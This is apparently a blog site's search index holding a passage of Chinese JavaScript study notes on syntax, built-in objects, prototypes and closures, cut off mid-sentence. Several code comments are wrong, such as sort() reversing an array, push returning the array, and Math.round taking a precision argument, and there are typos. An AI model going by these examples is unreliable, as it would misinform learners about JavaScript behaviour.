<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>JS各种对象的属性方法</title>
      <link href="/2019/10/08/JS%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%B1%9E%E6%80%A7%E6%96%B9%E6%B3%95/"/>
      <url>/2019/10/08/JS%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%B1%9E%E6%80%A7%E6%96%B9%E6%B3%95/</url>
      <content type="html"><![CDATA[<h3 id="1-初级"><a href="#1-初级" class="headerlink" title="1. 初级"></a>1. 初级</h3><h4 id="1-1-语法和数据类型"><a href="#1-1-语法和数据类型" class="headerlink" title="1.1 语法和数据类型"></a>1.1 语法和数据类型</h4><ul><li><p>声明变量<br><code>var/let/const</code>， 如果没有赋初始值，则其值为<code>undefined</code>，试图访问一个未声明的变量会导致一个<code>ReferenceError</code>异常抛出。你可以使用<code>undefined</code>来判断变量是否已赋值。<code>undefined</code>值在布尔类型环境中会被当做<code>false</code>,在数值类型环境中，会被转换为<code>NaN</code>。</p></li><li><p>变量的作用域<br>全局变量-在所有函数之外生命的变量；局部变量-在函数内部生命的变量。ES6之前的js没有语句块作用域。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(true)&#123;</span><br><span class="line">  var x = 5;</span><br><span class="line">  let y = 5;</span><br><span class="line">&#125;</span><br><span class="line">console.log(x);   // 5</span><br><span class="line">console.log(y);   // ReferenceError: y is not defined</span><br></pre></td></tr></table></figure></li><li><p>变量声明提升<br>变量会被提升或移到了函数或语句的顶部。然后提升后的变量将返回<code>undefined</code>值。在使用或引用某个变量之后进行声明和初始化操作。<code>let</code>将不会提升变量到代码块的顶部。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">console.log(x === undefined)  // true</span><br><span class="line">var x = &apos;global value&apos;;</span><br><span class="line"></span><br><span class="line">(function()&#123;</span><br><span class="line">  console.log(x); // undefined</span><br><span class="line">  var x = &apos;local value&apos;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></li><li><p>函数提升<br>只有函数声明会被提升到顶部，而不包含函数的表达式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 函数声明</span><br><span class="line">foo();   // &apos;bar&apos;</span><br><span class="line">function foo() &#123;</span><br><span class="line">  console.log(&apos;bar&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 函数表达式</span><br><span class="line">baz();  // TypeError: baz is not a function</span><br><span class="line">var baz = function() &#123;</span><br><span class="line">  console.log(&apos;baz&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><em>数据类型</em>: Boolean, null, undefined, Number, String, Symbol, Object</p></li><li><p><em>false等效值</em>: false, undefined, null, 0, NaN, ‘’(空字符串)<br><br></p></li></ul><h4 id="1-2-循环和迭代"><a href="#1-2-循环和迭代" class="headerlink" title="1.2 循环和迭代"></a>1.2 循环和迭代</h4><ul><li><p>break<br>使用<code>break</code>来终止循环，它会立即终止当前所在的while, do-while, for, 或者switch并把控制权交回这些结构后面的语句</p></li><li><p>continue<br><code>continue</code>语句可以用来继续执行（跳过代码块的剩余部分并进入下一个循环）一个while, do-while, for语句<br><br></p></li></ul><h4 id="1-3-函数"><a href="#1-3-函数" class="headerlink" title="1.3 函数"></a>1.3 函数</h4><p>在函数内定义的变量不能在函数之外的任何地方访问，相应的，一个函数可以访问定义在其范围内的任何变量和函数。</p><ul><li><p>箭头函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var a2 = a.map(function(s)&#123; return s.length &#125;);</span><br><span class="line">var a3 = a.map(s =&gt; s.length)</span><br></pre></td></tr></table></figure></li><li><p>预定义函数</p></li></ul><table><thead><tr><th>函数</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>eval()</td><td style="text-align:center">对一串字符串形式的js代码字符求值</td></tr><tr><td>uneval()</td><td style="text-align:center">表示给定对象的源代码的字符串</td></tr><tr><td>isFinite()</td><td style="text-align:center">判断是否是有限的数值</td></tr><tr><td>isNaN()</td><td style="text-align:center">判断一个值是否是NaN</td></tr><tr><td>parseFloat()</td><td style="text-align:center">返回一个浮点数</td></tr><tr><td>parseInt()</td><td style="text-align:center">返回一个整数</td></tr><tr><td>encodeURI()、encodeURIComponent()</td><td style="text-align:center">把字符串作为URI进行编码</td></tr><tr><td>decodeURI()、decoreURIComponent()</td><td style="text-align:center">对encodeURI()编码过的URI进行解码</td></tr></tbody></table><p><br></p><h4 id="1-4-表达式和运算符"><a href="#1-4-表达式和运算符" class="headerlink" title="1.4 表达式和运算符"></a>1.4 表达式和运算符</h4><table><thead><tr><th></th><th style="text-align:center">一元操作符/关系操作符</th></tr></thead><tbody><tr><td>delete</td><td style="text-align:center"><code>delete objectName</code> / <code>delete objectName.property</code> / <code>delete arrayName[index]</code>，delete操作成功，元素会变成<code>undefined</code>。Delete成功返回<code>true</code>,不成功返回<code>false</code></td></tr><tr><td>typeof</td><td style="text-align:center">返回一个变量的类型的字符串值 <code>return &quot;function/string/number/object/undefined/boolean&quot;</code></td></tr><tr><td>in</td><td style="text-align:center"><code>index in Array</code>, <code>propertName in object</code>，如果所指定的属性存在于对象中，则返回<code>true</code></td></tr><tr><td>instanceof</td><td style="text-align:center">判断对象是不是所指定的类型<code>objectName instanceof objectType</code></td></tr></tbody></table><p><br></p><h4 id="1-5-Number对象"><a href="#1-5-Number对象" class="headerlink" title="1.5 Number对象"></a>1.5 Number对象</h4><ul><li><em>Number的方法</em><br>parseFloat(), parseInt(), isFinite(), isInteger(), isNaN(), isSafeInteger();</li><li><em>Number原型上的一些方法</em><br><strong>toExponential()</strong>: 返回一个数字的指数形式的字符串，形如: 1.23e+2;<br><strong>toFixed()</strong>: 返回指定小数位数的表示形式，<code>var a = 123; a.toFixed(2) // 123.00</code><br><strong>toPrecision()</strong>: 返回一个指定精度的数字， <code>var a = 123; a.toPrecision(2) // 1.2e+2</code><br><br></li></ul><h4 id="1-6-Math对象"><a href="#1-6-Math对象" class="headerlink" title="1.6 Math对象"></a>1.6 Math对象</h4><ul><li><em>Math常用方法</em><br><strong>floor()</strong>     :向下取整<br><strong>ceil()</strong>      :向上取整<br><strong>min() max()</strong> :返回一个以逗号间隔的数字参数列表中的最大/最小值<br><strong>random()</strong>    :返回0和1之间的随机数<br><strong>round(3.1415926,2)=3.14</strong></li><li><em>Math计算方法</em><br>PI, abs(), sin(),sqrt(), log10()等<br><br></li></ul><h4 id="1-7-Date对象"><a href="#1-7-Date对象" class="headerlink" title="1.7 Date对象"></a>1.7 Date对象</h4><p>Date是以1970年1月1日00:00:00以来的毫秒数来存储。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var today = new Date();</span><br><span class="line">var a = new Date(&apos;December 25, 1995 13:00:00&apos;);</span><br><span class="line">today.getTime()        // 毫秒数</span><br><span class="line">today.getFullYear()    // 年</span><br><span class="line">today.getMonth()       // 月</span><br><span class="line">today.getHours()       // 当前 时</span><br><span class="line">today.getMinutes()     // 当前 分</span><br><span class="line">today.getSeconds()     // 当前 秒</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-8-String"><a href="#1-8-String" class="headerlink" title="1.8 String"></a>1.8 String</h4><p>String用于表示文本型的数据，它是由无符号整数值(16bit)作为元素而组成的集合。Unicode转义序列在\u之后需要至少4个字符。</p><table><thead><tr><th></th><th style="text-align:center">String对象方法</th></tr></thead><tbody><tr><td>charAt, charCodeAt, codePointAt</td><td style="text-align:center">返回字符串指定位置的字符或者字符编码 <code>&#39;hello&#39;.charAt(0) // &#39;h&#39;</code></td></tr><tr><td>indexOf, lastIndexOf</td><td style="text-align:center">返回字符串中指定子串的位置或最后位置</td></tr><tr><td>startsWith, endsWith, includes</td><td style="text-align:center">返回字符串是否以指定字符串开始、结束、或包含指定字符串</td></tr><tr><td>concat</td><td style="text-align:center">连接两个字符串并返回新的字符串</td></tr><tr><td>fromCharCode, fromCodePoint</td><td style="text-align:center">从指定的Unicode值序列构造一个字符串。</td></tr><tr><td>split</td><td style="text-align:center">将字符串分离成一个个子串，并放入数组中</td></tr><tr><td>slice</td><td style="text-align:center">从一个字符串中提取片段并作为新字符串返回</td></tr><tr><td>substring,substr</td><td style="text-align:center">分别通过指定起始和结束位置，起始位置和长度来返回字符串的指定子集</td></tr><tr><td>match, replace, search</td><td style="text-align:center">通过正则表达式来工作</td></tr><tr><td>toLowerCase, toUpperCase</td><td style="text-align:center">返回字符串的小写、大写表示</td></tr><tr><td>normalize</td><td style="text-align:center">按照指定的Unicode形式将字符串正规化</td></tr><tr><td>repeat</td><td style="text-align:center">将字符串内容重复指定次数后返回</td></tr><tr><td>trim</td><td style="text-align:center">去掉字符串开头和结尾的空白字符</td></tr></tbody></table><ul><li>模板字符串<br>使用反勾号(``)包裹内容，它可以实现多行字符串或字符串内插等特性。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 多行</span><br><span class="line">&quot;line 1 \n\</span><br><span class="line"> line 2&quot;</span><br><span class="line">`line 1</span><br><span class="line"> line 2`</span><br><span class="line"></span><br><span class="line"> // 嵌入表达式</span><br><span class="line"> &quot;fifteen is&quot; + (a + b) + &quot;years old&quot;</span><br><span class="line"> `fifteen $&#123; a + b &#125; years old`</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="1-9-正则表达式"><a href="#1-9-正则表达式" class="headerlink" title="1.9 正则表达式"></a>1.9 正则表达式</h4><p><code>let regex = new RegExp(/^[a-zA-Z]+[0-9]*W?_$/, &quot;gi&quot;)</code></p><table><thead><tr><th></th><th style="text-align:center">正则表达式方法</th></tr></thead><tbody><tr><td>exec</td><td style="text-align:center">在字符串中查看匹配的RegExp方法，返回一个数组或null</td></tr><tr><td>test</td><td style="text-align:center">在字符串中测试是否匹配的RegExp方法，返回true或fasle</td></tr><tr><td>match</td><td style="text-align:center">在字符串中查找匹配的string方法，返回一个数组或null</td></tr><tr><td>search</td><td style="text-align:center">在字符串中测试匹配的string方法，返回匹配到的位置索引，或-1</td></tr><tr><td>replace</td><td style="text-align:center">在字符串中查找匹配的string方法，并且替换字符串</td></tr><tr><td>split</td><td style="text-align:center">使用正则分隔一个字符串，存储到数组中</td></tr></tbody></table><p><br></p><h4 id="1-10-Array对象"><a href="#1-10-Array对象" class="headerlink" title="1.10 Array对象"></a>1.10 Array对象</h4><p>数组是一个有序的数据集合，我们可以通过数组名称和索引进行访问。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var a = Array(42);</span><br><span class="line">var b = [];</span><br><span class="line">b.length = 42;</span><br><span class="line">a.forEach(function(item)&#123;&#125;)</span><br></pre></td></tr></table></figure></p><table><thead><tr><th></th><th style="text-align:center">数组的方法</th></tr></thead><tbody><tr><td>concat</td><td style="text-align:center">连接两个数组并返回一个新的数组 <code>[1,2,3]concat(&#39;a&#39;,&#39;b&#39;); // [1,2,3,&#39;a&#39;,&#39;b&#39;]</code></td></tr><tr><td>join</td><td style="text-align:center">将数组的所有元素连接成一个字符串 <code>[1,2,3].join(&#39;-&#39;) // 1-2-3</code></td></tr><tr><td>push</td><td style="text-align:center">在数组末尾添加一个或多个元素，并返回数组操作后的长度 <code>[1,2,3].push(1) // [1,2,3,1]</code></td></tr><tr><td>pop</td><td style="text-align:center">从数组移出最后一个元素，并返回该元素。</td></tr><tr><td>shift</td><td style="text-align:center">从数组移除第一个元素</td></tr><tr><td>unshift</td><td style="text-align:center">从数组开头添加元素 <code>[1,2,3].unshift(4,5) // [4,5,1,2,3]</code></td></tr><tr><td>slice</td><td style="text-align:center">从数组提取一个片段，并作为一个新数组 <code>[1,2,3,4].slice(0,2) // [1,2]</code></td></tr><tr><td>splice</td><td style="text-align:center">从数组移出一些元素，并替换它们 <code>slice(index, count_to_move, addElement1, addElement2);[1,2,3,4,5].splice(1,3,&#39;a&#39;,&#39;b&#39;) // [1,&#39;a&#39;,&#39;b&#39;,5]</code></td></tr><tr><td>reverse</td><td style="text-align:center">颠倒数组元素的顺序 <code>[1,2,3].reverse() // [3,2,1]</code></td></tr><tr><td>sort</td><td style="text-align:center">给数组元素排序 <code>[1,2,3].sort() // [3,2,1]</code></td></tr><tr><td>indexOf</td><td style="text-align:center">在数组中搜索searchElement 并返回第一个匹配的索引 <code>[1,1,1,2].indexOf(2,1) // 3 indexOf(searchElement, fromIndex)</code></td></tr><tr><td>lastIndexOf</td><td style="text-align:center">和indexOf差不多，从结尾开始，反向搜索 </td></tr><tr><td>forEach</td><td style="text-align:center">在数组每个元素上执行callback <code>[1,2,3].forEach(fucntion(item){ callback(item); })</code></td></tr><tr><td>map</td><td style="text-align:center">在数组每个元素上执行callback，将所有操作结果放入数组中，返回该新数组 <code>[1,2,3].map(function(item){ return callback(item) })</code></td></tr><tr><td>filter</td><td style="text-align:center">返回一个在回调函数上返回true的元素的新数组 <code>[1,&#39;a&#39;].filter(function(item){ return typeof item === &#39;number&#39;}) // [1]</code></td></tr><tr><td>every</td><td style="text-align:center">当数组中每一个元素在callback上被返回true时，就返回true <code>[1, 2].every(function(item){ return typeof item === &#39;number&#39;}) // true</code></td></tr><tr><td>some</td><td style="text-align:center">只要数组中有一项在callback上被返回true，就返回true <code>[1,&#39;a&#39;].some(function(item){ return typeof item === &#39;number&#39;}) // true</code></td></tr><tr><td>reduce</td><td style="text-align:center">使用callback(firstValue, secondValue)把数组列表计算成一个单一值。 <code>[1,2].reduce(function(first,second){ return first + second}, 0) // 3</code></td></tr><tr><td>reduceRight</td><td style="text-align:center">和reduce相似，从最后一个元素开始</td></tr><tr><td>toString</td><td style="text-align:center">返回一个包含数组中所有元素的字符串，每个元素通过逗号分隔</td></tr></tbody></table><p><br></p><h4 id="1-11-Map对象"><a href="#1-11-Map对象" class="headerlink" title="1.11 Map对象"></a>1.11 Map对象</h4><p>一个Map对象是一个简单的键值对映射集合，可以按照数据插入时的顺序遍历所有的元素。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var a = new Map();</span><br><span class="line">a.set(&apos;dog&apos;, 123);</span><br><span class="line">a.size // 1</span><br><span class="line">a.get(&apos;fox&apos;) // undefined</span><br><span class="line">a.has(&apos;dog&apos;) // true</span><br><span class="line">a.delete(&apos;dog&apos;)</span><br><span class="line">for (var [key, value] of a)&#123;</span><br><span class="line">  console.log(key + value)</span><br><span class="line">&#125;</span><br><span class="line">a.clear()</span><br></pre></td></tr></table></figure></p><p><em>Object和Map的对比</em><br>Object被用于将字符串类型映射到数值。object允许设置键值对、根据键获取值，删除键，检查某个键是否存在。而Map具有更多优势。</p><ul><li>Object的键均为strings类型，在Map里键可以是任意类型</li><li>Object的尺寸必须手动计算，Map的尺寸则很容易获得</li><li>Map的遍历遵循元素的插入顺序</li><li>Object有原型，所有映射中有一些缺省的值<br><br></li></ul><h4 id="1-12-Set对象"><a href="#1-12-Set对象" class="headerlink" title="1.12 Set对象"></a>1.12 Set对象</h4><p>Set对象是一组值得集合，这些值都是不重复的， 可以按照添加顺序来遍历。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var a = new Set();</span><br><span class="line">a.add(1);</span><br><span class="line">a.add(&apos;foo&apos;);</span><br><span class="line">a.has(1);</span><br><span class="line">a.delete(1);</span><br><span class="line">a.size</span><br><span class="line">for(let item of a)&#123; console.log(item) &#125;</span><br><span class="line"></span><br><span class="line">// Array和Set的转换</span><br><span class="line">Array.from(mySet);</span><br><span class="line">mySet = new Set([1,2,3])</span><br></pre></td></tr></table></figure></p><p><em>Array和Set的对比</em></p><ul><li>数组中判断元素是否存在的<code>indexOf</code>函数效率低下</li><li>Set允许根据值删除元素，而数组中必须用splice方法</li><li>Array的indexOf无法找到NaN值</li><li>Set对象存储不重复的值<br><br></li></ul><h4 id="1-13-Object"><a href="#1-13-Object" class="headerlink" title="1.13 Object"></a>1.13 Object</h4><ul><li><p>枚举一个对象的所有属性<br>for…in, Object.keys(obj), Object.getOwnPropertyNames(obj)</p></li><li><p>创建新对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// 1. 使用对象初始化器</span><br><span class="line">var obj = &#123; property_1: value_1 &#125;</span><br><span class="line"></span><br><span class="line">// 2. 使用构造函数，通过new创建对象实例</span><br><span class="line">function Car(make)&#123;</span><br><span class="line">  this.make = make;</span><br><span class="line">&#125;</span><br><span class="line">var myCar = new Car(&apos;Eagle&apos;)</span><br><span class="line"></span><br><span class="line">// 你可以通过prototype属性为之前定义的对象类型增加属性。该类型的所有对象，而不仅仅是一个。</span><br><span class="line">Car.propotype.color = null;</span><br><span class="line"></span><br><span class="line">// 3. 使用Object.create方法, 它允许你为创建的对象选择其原型对象，而不用定义一个构造函数。</span><br><span class="line">var Animal = &#123;</span><br><span class="line">  type: &apos;Invertebrrates&apos;,</span><br><span class="line">  displayType: function()&#123;</span><br><span class="line">    console.log(this.type)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">var animal1 = Object.create(Animal)</span><br></pre></td></tr></table></figure></li><li><p><em>this</em><br><code>this</code>在方法中使用以指代当前对象。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function validate(obj, lowval)&#123;</span><br><span class="line">  if (obj.value &lt; lowval) &#123;</span><br><span class="line">    alert(&apos;Invalid Value&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 在每个元素的oncahnge事件处理器中调用validate，并通过this传入相应元素</span><br><span class="line">&lt;input onChange=&quot;validate(this, 18)&quot;&gt;</span><br></pre></td></tr></table></figure></li><li><p>getter与setter</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var o = &#123; a: 0 &#125;;</span><br><span class="line">Object.defineProperties(o, &#123;</span><br><span class="line">  &quot;b&quot;: &#123; get: function() &#123; return this.a + 1 &#125;&#125;,</span><br><span class="line">  &quot;c&quot;: &#123; set: function(x) &#123; this.a = x / 2 &#125;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>删除属性: <code>delete myobj.a</code></p></li><li>比较对象: 两个独立声明的对象永远不会相等，即使他们有相同的属性，只有在比较一个对象和这个对象的引用时，才会返回true.<br><br></li></ul><h4 id="1-14-Promise"><a href="#1-14-Promise" class="headerlink" title="1.14 Promise"></a>1.14 Promise</h4><p>一个Promise就是一个代表了异步操作最终完成或者失败的对象。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">doSomething().then(doSomethingElse, failureCallback)</span><br><span class="line">doSomething()</span><br><span class="line">.then(result =&gt; doSomethingElse(result))</span><br><span class="line">.catch(failureCallback)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-15-迭代器和生成器"><a href="#1-15-迭代器和生成器" class="headerlink" title="1.15 迭代器和生成器"></a>1.15 迭代器和生成器</h4><ul><li><em>迭代器</em><br>一个迭代器对象，知道如何每次访问集合中的一项，并跟踪该序列中的当前位置。迭代器是一个对象，它提供了<code>next()</code>方法，用来返回序列中的下一项。这个方法包含<code>value</code>和<code>done</code>两个属性。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function makeIterator(array)&#123;</span><br><span class="line">  var nextIndex = 0;</span><br><span class="line">  return &#123;</span><br><span class="line">    next: function() &#123;</span><br><span class="line">      return nextIndex &lt; array.length ? &#123; value: array[nextIndex++], done: false &#125; : &#123; done: true &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">var it = makeIterator([1,2]);</span><br><span class="line">console.log(it.next().value) // 1</span><br><span class="line">console.log(it.next().value) // 2</span><br><span class="line">console.log(it.next().done)  // true</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><em>生成器</em><br>使用<code>function*</code>语法，函数将变成GeneratorFunction。它允许你定义一个包含自有迭代算法的函数，同时它可以自动维护自己的状态<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function* idMaker()&#123;</span><br><span class="line">  var index = 0;</span><br><span class="line">  while(true)</span><br><span class="line">    yield index++;</span><br><span class="line">&#125;</span><br><span class="line">var gen = idMaker();</span><br><span class="line">console.log(gen.next().value) // 0</span><br><span class="line">console.log(gen.next().value) // 1</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="2-中级"><a href="#2-中级" class="headerlink" title="2. 中级"></a>2. 中级</h3><h4 id="2-1-原型链"><a href="#2-1-原型链" class="headerlink" title="2.1 原型链"></a>2.1 原型链</h4><p>JS常被描述为一种<strong>基于原型的语言</strong>——每个对象拥有一个原型对象，对象以其原型为模板、从原型继承方法和属性。原型对象也可能拥有原型，并从中继承方法和属性，一层一层，这种关系常被称为<strong>原型链</strong>。准确地说，这些属性和方法定义在Object构造器(constructor functions)之上的<code>prototype</code>属性上，而非对象实例本身。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function a()&#123;&#125;;</span><br><span class="line">a.prototype.foo = &apos;bar&apos;;</span><br><span class="line">console.log(a.prototype)</span><br><span class="line">  &#123;</span><br><span class="line">    foo: &apos;bar&apos;,</span><br><span class="line">    constructor: ƒ a(),</span><br><span class="line">    __proto__: &#123;</span><br><span class="line">        constructor: ƒ Object(),</span><br><span class="line">        hasOwnProperty: ƒ hasOwnProperty(),</span><br><span class="line">        isPrototypeOf: ƒ isPrototypeOf(),</span><br><span class="line">        propertyIsEnumerable: ƒ propertyIsEnumerable(),</span><br><span class="line">        toLocaleString: ƒ toLocaleString(),</span><br><span class="line">        toString: ƒ toString(),</span><br><span class="line">        valueOf: ƒ valueOf()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">// new一个实例</span><br><span class="line">var b = new a();</span><br><span class="line">b.prop = &quot;some value&quot;;</span><br><span class="line">console.log(b)</span><br></pre></td></tr></table></figure></p><ul><li><p><em>prototype属性</em>: 继承成员被定义的地方<br><code>Object.prototype.watch()</code>等成员，适用于任何继承自<code>Object()</code>的对象类型，包括使用构造器创建的新的对象实例。<br><code>Object.watch()</code>以及其他不在<code>prototype</code>对象内的成员，不会被对象实例，或继承自Object()的对象类型所继承。</p></li><li><p><em>constructor属性</em><br>每个实例对象都从原型中继承了一个constructor属性，该属性指向了用于构造此实例对象的构造函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">person1.constructor 都将返回Person()构造器</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="2-2-重新介绍JS"><a href="#2-2-重新介绍JS" class="headerlink" title="2.2 重新介绍JS"></a>2.2 重新介绍JS</h4><ul><li>与大多数编程语言不通，JS没有输入或输出的概念。它是一个在主机环境下运行的脚本语言，任何与外界沟通的机制都是由主机环境提供的。浏览器是最常见的主机环境，但很多程序中也包含JS解释器，如Adobe Acrobat、Photoshop、SVG图像、Nodejs服务器。</li><li>JS不区分整数值和浮点数值，所有数字在JS中均用浮点数值表示。<br><code>0.1 + 0.2 = 0.30000000000000004</code></li><li><code>null</code>表示一个空值，<code>undefined</code>表示一个未初始化的值，也就是还没被分配的值。</li><li><code>&amp;&amp;</code>和<code>||</code>运算符使用短路逻辑，是否会执行第二个语句取决于第一个操作数的结果。</li><li>函数如果没有使用<code>return</code>语句，JS会返回<code>undefined</code></li><li>JS允许你创建匿名函数<br><code>(function(){ var a = 1 })();</code></li><li>如果在一个对象上使用点或方括号来访问属性/方法，这个对象就成了<code>this</code>。如果没有使用，那么<code>this</code>将指向全局对象。</li><li>你可以在程序中的任何时候修改原型(prototype)中的一些东西，你可以在运行时给已存在的对象添加额外的方法。</li><li>你可以在一个函数内部定义函数。这是一个减少使用全局变量的好方法。</li><li><em>闭包</em><br>JS执行一个函数时，都会创建一个作用域对象(scope object)，用来保存这个函数中创建的局部变量。它和被传入函数的变量一起被初始化。与全局对象不同，你不能直接访问作用域对象，也没有可以遍历当前作用域对象里属性的方法。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function makeAdder(a) &#123;</span><br><span class="line">  return function(b) &#123;</span><br><span class="line">    return a + b</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">var x = makeAdder(5);</span><br><span class="line">var y = makeAdder(20);</span><br><span class="line">x(6); // 11</span><br><span class="line">y(7); // 27</span><br></pre></td></tr></table></figure></li></ul><p>JS具有一种垃圾回收机制——对象在被创建的时候分配内存，然后当指向这个对象的引用计数为零时，浏览器会回收内存。闭包很容易发生无意识的内存泄漏。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function addHandler() &#123;</span><br><span class="line">  var el = document.getElementById(&apos;el&apos;);</span><br><span class="line">  el.onclick = function() &#123;</span><br><span class="line">    el.style.backgroundColor = &apos;red&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这段代码创建了一个元素，当它被点击的时候变红，但同时它会发生内存泄漏。因为对<code>el</code>的引用不小心被放在一个匿名内部函数中。在JS对象，这个内部函数和本地对象之间<code>el</code>创建了一个循环引用。解决方法:不要使用<code>el</code>变量。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function addHandler() &#123;</span><br><span class="line">  document.getElementById(&apos;el&apos;).onclick = function() &#123;</span><br><span class="line">    this.style.backgroundColor = &apos;red&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>在JS里，对象可以被看作是一组属性的集合。用对象字面量语法来定义一个对象时，会自动初始化一组属性。例如，你定义了一个 var a = “hello”， 